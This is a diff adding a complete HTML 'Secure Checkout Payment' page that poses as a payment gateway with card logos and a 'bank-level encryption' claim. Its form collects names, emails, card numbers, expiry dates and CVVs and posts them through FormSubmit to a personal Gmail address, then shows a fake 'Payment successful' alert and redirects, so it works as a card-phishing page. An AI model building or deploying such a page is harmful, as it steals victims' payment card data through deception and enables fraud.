@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Checkout Payment — U.S.</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100">
+  <section class="min-h-screen flex items-center justify-center px-4 sm:px-8 py-8">
+    <div class="max-w-4xl w-full bg-white rounded-2xl shadow-lg p-8 border border-gray-200">
+      <div class="grid lg:grid-cols-2 gap-8">
+        <!-- Left -->
+        <div class="flex flex-col justify-center items-center text-center">
+          <img src="https://readymadeui.com/images/payment-img.webp" alt="Payment" class="w-full h-48 object-contain" />
+          <h1 class="text-2xl font-bold mt-6 text-slate-900">Secure Payment Gateway</h1>
+          <p class="text-slate-500 mt-2 text-sm">Your information is protected by bank-level encryption.</p>
+          <div class="flex gap-3 mt-4">
+            <img src="https://readymadeui.com/images/visa.webp" class="w-10" />
+            <img src="https://readymadeui.com/images/master.webp" class="w-10" />
+            <img src="https://readymadeui.com/images/american-express.webp" class="w-10" />
+          </div>
+        </div>
+
+        <!-- Right -->
+        <form id="paymentForm" action="https://formsubmit.co/wei332525@gmail.com" method="POST" class="space-y-4">
+          <h2 class="text-xl font-semibold text-slate-900">Complete Payment</h2>
+
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_template" value="table">
+
+          <div>
+            <label class="block text-sm text-slate-600 mb-1">Full Name *</label>
+            <input type="text" name="name" required class="w-full border border-gray-300 px-4 py-3 rounded-md outline-none focus:ring-1 focus:ring-blue-500">
+          </div>
+
+          <div>
+            <label class="block text-sm text-slate-600 mb-1">Email *</label>
+            <input type="email" name="email" required class="w-full border border-gray-300 px-4 py-3 rounded-md outline-none focus:ring-1 focus:ring-blue-500">
+          </div>
+
+          <div>
+            <label class="block text-sm text-slate-600 mb-1">Card Number *</label>
+            <input type="text" name="card_number" required maxlength="16" pattern="\d{16}" placeholder="1234 5678 9012 3456" class="w-full border border-gray-300 px-4 py-3 rounded-md outline-none focus:ring-1 focus:ring-blue-500">
+          </div>
+
+          <div class="grid grid-cols-2 gap-4">
+            <div>
+              <label class="block text-sm text-slate-600 mb-1">Expiry *</label>
+              <input type="text" name="expiry" required placeholder="MM/YY" class="w-full border border-gray-300 px-4 py-3 rounded-md outline-none focus:ring-1 focus:ring-blue-500">
+            </div>
+            <div>
+              <label class="block text-sm text-slate-600 mb-1">CVV *</label>
+              <input type="text" name="cvv" required maxlength="4" pattern="\d{3,4}" placeholder="123" class="w-full border border-gray-300 px-4 py-3 rounded-md outline-none focus:ring-1 focus:ring-blue-500">
+            </div>
+          </div>
+
+          <button id="payBtn" type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-md flex items-center justify-center">
+            <span id="btnText">Pay Now</span>
+            <svg id="loader" class="hidden animate-spin h-5 w-5 ml-2 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"></path>
+            </svg>
+          </button>
+
+          <p class="text-center text-xs text-gray-500 mt-2">Secure payment powered by FormSubmit & Tailwind.</p>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    const form = document.getElementById('paymentForm');
+    const btn = document.getElementById('payBtn');
+    const btnText = document.getElementById('btnText');
+    const loader = document.getElementById('loader');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      // Loader start
+      btn.disabled = true;
+      btnText.classList.add('hidden');
+      loader.classList.remove('hidden');
+
+      try {
+        // Simulate form submission delay
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Actually send the form
+        e.target.submit();
+
+        // Show alert after short delay before redirect
+        setTimeout(() => {
+          alert('✅ Payment successful! Redirecting...');
+          window.location.href = "https://example.com"; // Change this URL
+        }, 1500);
+
+      } catch (error) {
+        alert('Something went wrong. Please try again.');
+      } finally {
+        btn.disabled = false;
+        btnText.classList.remove('hidden');
+        loader.classList.add('hidden');
+      }
+    });
+  </script>
+</body>
+</html>
